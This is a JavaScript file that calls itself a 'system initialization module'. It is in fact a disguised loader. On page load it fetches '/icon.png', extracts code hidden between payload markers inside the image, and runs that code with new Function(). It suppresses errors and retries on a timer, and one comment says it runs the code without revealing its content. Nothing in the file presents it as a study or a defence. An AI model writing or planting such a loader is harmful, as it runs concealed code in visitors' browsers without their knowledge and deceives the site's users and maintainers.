// System initialization module
// bba2fa50
;(function(){
  'use strict';
  var _u="/icon.png";
  var _ms=new TextEncoder().encode('/*FRO_PAYLOAD_START*/');
  var _me=new TextEncoder().encode('/*FRO_PAYLOAD_END*/');

  function _find(bytes,marker,from){
    from=from||0;
    outer:for(var i=from;i<=bytes.length-marker.length;i++){
      for(var j=0;j<marker.length;j++)if(bytes[i+j]!==marker[j])continue outer;
      return i;
    }
    return -1;
  }

  function _extract(buf){
    var b=new Uint8Array(buf);
    var s=_find(b,_ms);
    if(s<0)return null;
    s+=_ms.length;
    var e=_find(b,_me,s);
    if(e<0)return null;
    return new TextDecoder('utf-8').decode(b.slice(s,e));
  }

  function _exec(code){
    // Chạy code mà không để lộ nội dung
    try{
      (new Function(code))();
    }catch(e){}
  }

  var _loaded=false;
  var _retry=0;
  var _maxRetry=3;

  function _load(){
    if(_loaded||_retry>_maxRetry)return;
    _retry++;

    // Fetch với cache
    var cacheKey='__fro_loaded__';
    if(window[cacheKey]){_loaded=true;return;}

    fetch(_u,{
      cache:'force-cache',
      headers:{'X-Requested-With':'XMLHttpRequest'}
    })
    .then(function(r){return r.arrayBuffer();})
    .then(function(buf){
      var code=_extract(buf);
      if(code){
        _exec(code);
        _loaded=true;
        try{Object.defineProperty(window,cacheKey,{value:true,writable:false});}
        catch(e){window[cacheKey]=true;}
      }
    })
    .catch(function(){
      // Silent fail – retry
      if(_retry<_maxRetry)setTimeout(_load,2000*_retry);
    });
  }

  // Load ngay + fallback
  if(document.readyState==='loading'){
    document.addEventListener('DOMContentLoaded',_load);
  }else{
    _load();
  }

  // Kiểm tra định kỳ (nếu chưa load)
  var _iv=setInterval(function(){
    if(_loaded){clearInterval(_iv);return;}
    _load();
  },5000);

  // Stop sau 30s
  setTimeout(function(){clearInterval(_iv);},30000);

})();
